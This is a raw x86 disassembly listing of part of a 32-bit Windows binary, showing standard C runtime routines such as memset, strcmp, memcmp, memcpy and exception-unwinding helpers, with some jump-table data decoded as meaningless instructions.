  426175:	cmp    edx,0x4
  426178:	jb     0x4261ab
  42617a:	neg    ecx
  42617c:	and    ecx,0x3
  42617f:	je     0x42618d
  426181:	sub    edx,ecx
  426183:	mov    BYTE PTR [edi],al
  426185:	add    edi,0x1
  426188:	sub    ecx,0x1
  42618b:	jne    0x426183
  42618d:	mov    ecx,eax
  42618f:	shl    eax,0x8
  426192:	add    eax,ecx
  426194:	mov    ecx,eax
  426196:	shl    eax,0x10
  426199:	add    eax,ecx
  42619b:	mov    ecx,edx
  42619d:	and    edx,0x3
  4261a0:	shr    ecx,0x2
  4261a3:	je     0x4261ab
  4261a5:	rep stos DWORD PTR es:[edi],eax
  4261a7:	test   edx,edx
  4261a9:	je     0x4261b5
  4261ab:	mov    BYTE PTR [edi],al
  4261ad:	add    edi,0x1
  4261b0:	sub    edx,0x1
  4261b3:	jne    0x4261ab
  4261b5:	mov    eax,DWORD PTR [esp+0x8]
  4261b9:	pop    edi
  4261ba:	ret    
  4261bb:	mov    eax,DWORD PTR [esp+0x4]
  4261bf:	ret    
  4261c0:	push   esi
  4261c1:	mov    esi,DWORD PTR [esp+0x8]
  4261c5:	test   esi,esi
  4261c7:	je     0x42634e
  4261cd:	push   DWORD PTR [esi+0x4]
  4261d0:	call   0x42446a
  4261d5:	push   DWORD PTR [esi+0x8]
  4261d8:	call   0x42446a
  4261dd:	push   DWORD PTR [esi+0xc]
  4261e0:	call   0x42446a
  4261e5:	push   DWORD PTR [esi+0x10]
  4261e8:	call   0x42446a
  4261ed:	push   DWORD PTR [esi+0x14]
  4261f0:	call   0x42446a
  4261f5:	push   DWORD PTR [esi+0x18]
  4261f8:	call   0x42446a
  4261fd:	push   DWORD PTR [esi]
  4261ff:	call   0x42446a
  426204:	push   DWORD PTR [esi+0x20]
  426207:	call   0x42446a
  42620c:	push   DWORD PTR [esi+0x24]
  42620f:	call   0x42446a
  426214:	push   DWORD PTR [esi+0x28]
  426217:	call   0x42446a
  42621c:	push   DWORD PTR [esi+0x2c]
  42621f:	call   0x42446a
  426224:	push   DWORD PTR [esi+0x30]
  426227:	call   0x42446a
  42622c:	push   DWORD PTR [esi+0x34]
  42622f:	call   0x42446a
  426234:	push   DWORD PTR [esi+0x1c]
  426237:	call   0x42446a
  42623c:	push   DWORD PTR [esi+0x38]
  42623f:	call   0x42446a
  426244:	push   DWORD PTR [esi+0x3c]
  426247:	call   0x42446a
  42624c:	add    esp,0x40
  42624f:	push   DWORD PTR [esi+0x40]
  426252:	call   0x42446a
  426257:	push   DWORD PTR [esi+0x44]
  42625a:	call   0x42446a
  42625f:	push   DWORD PTR [esi+0x48]
  426262:	call   0x42446a
  426267:	push   DWORD PTR [esi+0x4c]
  42626a:	call   0x42446a
  42626f:	push   DWORD PTR [esi+0x50]
  426272:	call   0x42446a
  426277:	push   DWORD PTR [esi+0x54]
  42627a:	call   0x42446a
  42627f:	push   DWORD PTR [esi+0x58]
  426282:	call   0x42446a
  426287:	push   DWORD PTR [esi+0x5c]
  42628a:	call   0x42446a
  42628f:	push   DWORD PTR [esi+0x60]
  426292:	call   0x42446a
  426297:	push   DWORD PTR [esi+0x64]
  42629a:	call   0x42446a
  42629f:	push   DWORD PTR [esi+0x68]
  4262a2:	call   0x42446a
  4262a7:	push   DWORD PTR [esi+0x6c]
  4262aa:	call   0x42446a
  4262af:	push   DWORD PTR [esi+0x70]
  4262b2:	call   0x42446a
  4262b7:	push   DWORD PTR [esi+0x74]
  4262ba:	call   0x42446a
  4262bf:	push   DWORD PTR [esi+0x78]
  4262c2:	call   0x42446a
  4262c7:	push   DWORD PTR [esi+0x7c]
  4262ca:	call   0x42446a
  4262cf:	add    esp,0x40
  4262d2:	push   DWORD PTR [esi+0x80]
  4262d8:	call   0x42446a
  4262dd:	push   DWORD PTR [esi+0x84]
  4262e3:	call   0x42446a
  4262e8:	push   DWORD PTR [esi+0x88]
  4262ee:	call   0x42446a
  4262f3:	push   DWORD PTR [esi+0x8c]
  4262f9:	call   0x42446a
  4262fe:	push   DWORD PTR [esi+0x90]
  426304:	call   0x42446a
  426309:	push   DWORD PTR [esi+0x94]
  42630f:	call   0x42446a
  426314:	push   DWORD PTR [esi+0x98]
  42631a:	call   0x42446a
  42631f:	push   DWORD PTR [esi+0x9c]
  426325:	call   0x42446a
  42632a:	push   DWORD PTR [esi+0xa0]
  426330:	call   0x42446a
  426335:	push   DWORD PTR [esi+0xa4]
  42633b:	call   0x42446a
  426340:	push   DWORD PTR [esi+0xa8]
  426346:	call   0x42446a
  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
